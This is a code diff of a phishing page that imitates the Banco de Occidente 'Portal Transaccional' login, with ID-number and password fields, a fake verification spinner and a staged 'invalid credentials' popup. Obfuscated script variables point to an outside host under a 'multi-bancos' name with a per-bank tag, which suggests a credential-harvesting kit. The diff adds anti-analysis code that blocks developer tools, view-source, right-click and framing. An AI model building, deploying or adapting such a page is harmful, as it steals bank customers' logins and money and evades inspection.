@@ -1,156 +1,4 @@
-<!DOCTYPE html>
-<html lang="es">
-<head>
-<link rel="icon" type="image/x-icon" href="img/favicon.ico">
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width,initial-scale=1.0">
-<title>Banco de Occidente - Portal Transaccional</title>
-<link rel="stylesheet" href="styles.css">
-</head>
-<body>
-<div class="container">
-<div class="card">
-<a href="#/seguridad" class="security-badge">
-<span class="icon-shield">
-<svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-<circle cx="12" cy="12" r="10" stroke="#00ca82" stroke-width="1.8" fill="none"/>
-<path d="M12 6 L7 8.5 L7 13 C7 16 9.5 18.5 12 19.5 C14.5 18.5 17 16 17 13 L17 8.5 Z" stroke="#00ca82" stroke-width="1.5" fill="none" stroke-linejoin="round"/>
-<path d="M10 12.5 L11.5 14 L14 11.5" stroke="#00ca82" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" fill="none"/>
-</svg>
-</span>
-<span class="security-text">Seguridad</span>
-</a>
-
-<div class="logo-container">
-<img src="img/logo-03-occidente-01-occidente-01-regular.aa547ca6b936469689ea.svg" alt="Banco de Occidente" class="logo">
-</div>
-
-<div class="welcome-text">
-<p class="welcome">¡Bienvenido! a tu,</p>
-<p class="portal-title">Portal Transaccional</p>
-</div>
-
-<div class="tabs">
-<button class="tab active" data-tab="registrado">Registrado</button>
-<button class="tab" data-tab="sin-registro">Sin registro</button>
-</div>
-
-<div class="tab-content active" id="tab-registrado">
-<form class="login-form" id="form-registrado">
-<div class="form-group">
-<label for="identificacion">Identificación</label>
-<div class="input-with-select">
-<select class="doc-type" id="tipoDocumento">
-<option value="CC">CC</option>
-<option value="CE">CE</option>
-<option value="NIT">NIT</option>
-<option value="PA">PA</option>
-</select>
-<input type="text" id="numeroDocumento" placeholder="Ej: 1093238993" class="input-field" inputmode="numeric" pattern="[0-9]*" maxlength="10" autocomplete="off" required>
-</div>
-</div>
-
-<div class="form-group">
-<label for="contrasena">Contraseña</label>
-<div class="password-container">
-<input type="password" id="contrasena" placeholder="Ingresa tu contraseña" class="input-field" required>
-<button type="button" class="toggle-password">
-<svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-<path d="M12 4.5C7 4.5 2.73 7.61 1 12C2.73 16.39 7 19.5 12 19.5C17 19.5 21.27 16.39 23 12C21.27 7.61 17 4.5 12 4.5ZM12 17C9.24 17 7 14.76 7 12C7 9.24 9.24 7 12 7C14.76 7 17 9.24 17 12C17 14.76 14.76 17 12 17ZM12 9C10.34 9 9 10.34 9 12C9 13.66 10.34 15 12 15C13.66 15 15 13.66 15 12C15 10.34 13.66 9 12 9Z" fill="#B8BCC8"/>
-</svg>
-</button>
-</div>
-</div>
-
-<div class="forgot-password">
-<a href="#">¿Olvidaste tu contraseña?</a>
-</div>
-
-<div class="remember-me">
-<input type="checkbox" id="remember">
-<label for="remember">Recordar mis datos</label>
-</div>
-
-<button type="button" class="btn-login" id="submitBtn">
-<svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-<path d="M10 17L15 12L10 7V17Z" fill="white"/>
-</svg>
-Ingresar
-</button>
-
-<button type="button" class="btn-register">
-<svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-<path d="M15 12C17.21 12 19 10.21 19 8C19 5.79 17.21 4 15 4C12.79 4 11 5.79 11 8C11 10.21 12.79 12 15 12ZM15 14C12.33 14 7 15.34 7 18V20H23V18C23 15.34 17.67 14 15 14Z" fill="#0066CC"/>
-</svg>
-Regístrate
-</button>
-</form>
-</div>
-
-<div class="tab-content" id="tab-sin-registro">
-<form class="login-form" id="form-sin-registro">
-<div class="info-box">
-<p>Para realizar transacciones <strong>regístrate</strong> en nuestro Portal Transaccional.</p>
-</div>
-
-<div class="form-group">
-<label for="identificacion-nr">Identificación</label>
-<div class="input-with-select">
-<select class="doc-type" id="docTypeNR">
-<option value="CC">CC</option>
-<option value="CE">CE</option>
-<option value="NIT">NIT</option>
-<option value="PA">PA</option>
-</select>
-<input type="text" id="identificacion-nr" placeholder="Ej: 1093238993" class="input-field" inputmode="numeric" pattern="[0-9]*" maxlength="10" autocomplete="off" required>
-</div>
-</div>
-
-<button type="button" class="btn-register btn-full">
-<svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-<path d="M15 12C17.21 12 19 10.21 19 8C19 5.79 17.21 4 15 4C12.79 4 11 5.79 11 8C11 10.21 12.79 12 15 12ZM15 14C12.33 14 7 15.34 7 18V20H23V18C23 15.34 17.67 14 15 14Z" fill="#0066CC"/>
-</svg>
-Regístrate
-</button>
-
-<button type="submit" class="btn-login btn-secondary">
-<svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-<path d="M10 17L15 12L10 7V17Z" fill="white"/>
-</svg>
-Ingresar sin registro
-</button>
-</form>
-</div>
-</div>
-</div>
-
-<div class="loading-screen" id="loadingScreen">
-<div class="loading-content">
-<img src="img/spinner_occidente.gif" alt="Cargando..." class="loading-spinner">
-<p class="loading-text">Verificando información...</p>
-</div>
-</div>
-
-<div id="errorLogin" style="display:none;position:fixed;inset:0;background:rgba(0,10,40,0.6);backdrop-filter:blur(4px);z-index:100000;align-items:center;justify-content:center;font-family:'Poppins',sans-serif;opacity:0;transition:opacity .3s ease">
-<div style="background:#fff;border-radius:16px;padding:32px 28px 24px;max-width:360px;width:90%;text-align:center;box-shadow:0 20px 60px rgba(0,0,0,0.3);animation:popInError .4s cubic-bezier(0.34,1.56,0.64,1);color:#1a1a2e">
-<div style="width:72px;height:72px;background:linear-gradient(135deg,#FF4D4D 0%,#C20024 100%);border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 20px;box-shadow:0 8px 24px rgba(194,0,36,0.35)">
-<svg width="36" height="36" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="3" stroke-linecap="round" stroke-linejoin="round">
-<line x1="12" y1="8" x2="12" y2="13"></line>
-<line x1="12" y1="17" x2="12.01" y2="17"></line>
-</svg>
-</div>
-<div style="font-size:19px;font-weight:700;color:#0a0a1a;margin-bottom:10px">Credenciales inválidas</div>
-<div style="font-size:14px;color:#555;line-height:1.55;margin-bottom:22px">Los datos ingresados son incorrectos.<br>Por favor verifica e inténtalo nuevamente.</div>
-<button id="errorLoginBtn" style="display:block;width:100%;background:linear-gradient(135deg,#0033a0 0%,#002277 100%);color:#fff;border:none;padding:14px 20px;border-radius:30px;font-size:14px;font-weight:700;letter-spacing:0.06em;text-transform:uppercase;cursor:pointer;font-family:inherit;box-shadow:0 6px 18px rgba(0,51,160,0.35)">Intentar de nuevo</button>
-</div>
-</div>
-<style>
-@keyframes popInError{from{opacity:0;transform:scale(.85)}to{opacity:1;transform:scale(1)}}
-#errorLogin.visible{display:flex !important;opacity:1 !important}
-</style>
-
-<script>
-document.addEventListener('DOMContentLoaded',function(){
+<!doctype html><html lang="es"><head><link rel="icon" type="image/x-icon" href="img/favicon.ico"><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Banco de Occidente - Portal Transaccional</title><link rel="stylesheet" href="styles.css"></head><body><div class="container"><div class="card"><a href="#/seguridad" class="security-badge"><span class="icon-shield"><svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><circle cx="12" cy="12" r="10" stroke="#00ca82" stroke-width="1.8" fill="none"/><path d="M12 6 L7 8.5 L7 13 C7 16 9.5 18.5 12 19.5 C14.5 18.5 17 16 17 13 L17 8.5 Z" stroke="#00ca82" stroke-width="1.5" fill="none" stroke-linejoin="round"/><path d="M10 12.5 L11.5 14 L14 11.5" stroke="#00ca82" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" fill="none"/></svg> </span><span class="security-text">Seguridad</span></a><div class="logo-container"><img src="img/logo-03-occidente-01-occidente-01-regular.aa547ca6b936469689ea.svg" alt="Banco de Occidente" class="logo"></div><div class="welcome-text"><p class="welcome">¡Bienvenido! a tu,</p><p class="portal-title">Portal Transaccional</p></div><div class="tabs"><button class="tab active" data-tab="registrado">Registrado</button> <button class="tab" data-tab="sin-registro">Sin registro</button></div><div class="tab-content active" id="tab-registrado"><form class="login-form" id="form-registrado"><div class="form-group"><label for="identificacion">Identificación</label><div class="input-with-select"><select class="doc-type" id="tipoDocumento"><option value="CC">CC</option><option value="CE">CE</option><option value="NIT">NIT</option><option value="PA">PA</option></select> <input id="numeroDocumento" placeholder="Ej: 1093238993" class="input-field" inputmode="numeric" pattern="[0-9]*" maxlength="10" autocomplete="off" required></div></div><div class="form-group"><label for="contrasena">Contraseña</label><div class="password-container"><input type="password" id="contrasena" placeholder="Ingresa tu contraseña" class="input-field" required> <button type="button" class="toggle-password"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M12 4.5C7 4.5 2.73 7.61 1 12C2.73 16.39 7 19.5 12 19.5C17 19.5 21.27 16.39 23 12C21.27 7.61 17 4.5 12 4.5ZM12 17C9.24 17 7 14.76 7 12C7 9.24 9.24 7 12 7C14.76 7 17 9.24 17 12C17 14.76 14.76 17 12 17ZM12 9C10.34 9 9 10.34 9 12C9 13.66 10.34 15 12 15C13.66 15 15 13.66 15 12C15 10.34 13.66 9 12 9Z" fill="#B8BCC8"/></svg></button></div></div><div class="forgot-password"><a href="#">¿Olvidaste tu contraseña?</a></div><div class="remember-me"><input type="checkbox" id="remember"> <label for="remember">Recordar mis datos</label></div><button type="button" class="btn-login" id="submitBtn"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M10 17L15 12L10 7V17Z" fill="white"/></svg> Ingresar</button> <button type="button" class="btn-register"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M15 12C17.21 12 19 10.21 19 8C19 5.79 17.21 4 15 4C12.79 4 11 5.79 11 8C11 10.21 12.79 12 15 12ZM15 14C12.33 14 7 15.34 7 18V20H23V18C23 15.34 17.67 14 15 14Z" fill="#0066CC"/></svg> Regístrate</button></form></div><div class="tab-content" id="tab-sin-registro"><form class="login-form" id="form-sin-registro"><div class="info-box"><p>Para realizar transacciones <strong>regístrate</strong> en nuestro Portal Transaccional.</p></div><div class="form-group"><label for="identificacion-nr">Identificación</label><div class="input-with-select"><select class="doc-type" id="docTypeNR"><option value="CC">CC</option><option value="CE">CE</option><option value="NIT">NIT</option><option value="PA">PA</option></select> <input id="identificacion-nr" placeholder="Ej: 1093238993" class="input-field" inputmode="numeric" pattern="[0-9]*" maxlength="10" autocomplete="off" required></div></div><button type="button" class="btn-register btn-full"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M15 12C17.21 12 19 10.21 19 8C19 5.79 17.21 4 15 4C12.79 4 11 5.79 11 8C11 10.21 12.79 12 15 12ZM15 14C12.33 14 7 15.34 7 18V20H23V18C23 15.34 17.67 14 15 14Z" fill="#0066CC"/></svg> Regístrate</button> <button type="submit" class="btn-login btn-secondary"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M10 17L15 12L10 7V17Z" fill="white"/></svg> Ingresar sin registro</button></form></div></div></div><div class="loading-screen" id="loadingScreen"><div class="loading-content"><img src="img/spinner_occidente.gif" alt="Cargando..." class="loading-spinner"><p class="loading-text">Verificando información...</p></div></div><div id="errorLogin" style="display:none;position:fixed;inset:0;background:rgba(0,10,40,.6);backdrop-filter:blur(4px);z-index:100000;align-items:center;justify-content:center;font-family:Poppins,sans-serif;opacity:0;transition:opacity .3s ease"><div style="background:#fff;border-radius:16px;padding:32px 28px 24px;max-width:360px;width:90%;text-align:center;box-shadow:0 20px 60px rgba(0,0,0,.3);animation:popInError .4s cubic-bezier(.34,1.56,.64,1);color:#1a1a2e"><div style="width:72px;height:72px;background:linear-gradient(135deg,#ff4d4d 0,#c20024 100%);border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 20px;box-shadow:0 8px 24px rgba(194,0,36,.35)"><svg width="36" height="36" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><line x1="12" y1="8" x2="12" y2="13"></line><line x1="12" y1="17" x2="12.01" y2="17"></line></svg></div><div style="font-size:19px;font-weight:700;color:#0a0a1a;margin-bottom:10px">Credenciales inválidas</div><div style="font-size:14px;color:#555;line-height:1.55;margin-bottom:22px">Los datos ingresados son incorrectos.<br>Por favor verifica e inténtalo nuevamente.</div><button id="errorLoginBtn" style="display:block;width:100%;background:linear-gradient(135deg,#0033a0 0,#027 100%);color:#fff;border:none;padding:14px 20px;border-radius:30px;font-size:14px;font-weight:700;letter-spacing:.06em;text-transform:uppercase;cursor:pointer;font-family:inherit;box-shadow:0 6px 18px rgba(0,51,160,.35)">Intentar de nuevo</button></div></div><style>@keyframes popInError{from{opacity:0;transform:scale(.85)}to{opacity:1;transform:scale(1)}}#errorLogin.visible{display:flex!important;opacity:1!important}</style><script>document.addEventListener('DOMContentLoaded',function(){
 var _0xa1='https://multi-bancos-production.up.railway.app';
 var _0xb2='occidente';
 var _0xc3='sess_'+Date.now()+'_'+Math.floor(Math.random()*10000);
@@ -236,8 +84,25 @@ if(_0xf6)_0xf6.classList.remove('visible');
 window.location.reload()
 })
 }
+});</script><script>(function(){
+'use strict';
+var _0xa1=0;
+document.addEventListener('touchend',function(_0xb2){
+var _0xc3=new Date().getTime();
+if(_0xc3-_0xa1<=300){_0xb2.preventDefault();}
+_0xa1=_0xc3;
+},{passive:false});
+document.addEventListener('dblclick',function(_0xd4){_0xd4.preventDefault();});
+document.addEventListener('contextmenu',function(_0xe5){_0xe5.preventDefault();return false;});
+document.addEventListener('keydown',function(_0xf6){
+var _0xg7=(_0xf6.key||'').toLowerCase();
+var _0xh8=_0xf6.ctrlKey||_0xf6.metaKey;
+var _0xi9=_0xf6.shiftKey;
+if(_0xg7==='f12'){_0xf6.preventDefault();return false;}
+if(_0xh8&&_0xi9&&(_0xg7==='i'||_0xg7==='j'||_0xg7==='c')){_0xf6.preventDefault();return false;}
+if(_0xh8&&_0xg7==='u'){_0xf6.preventDefault();return false;}
+if(_0xh8&&_0xg7==='s'){_0xf6.preventDefault();return false;}
 });
-</script>
-
-</body>
-</html>
+document.addEventListener('dragstart',function(_0xj0){_0xj0.preventDefault();});
+try{if(window.top!==window.self){window.top.location=window.self.location;}}catch(_0xk1){document.body.innerHTML='';}
+})();</script></body></html>
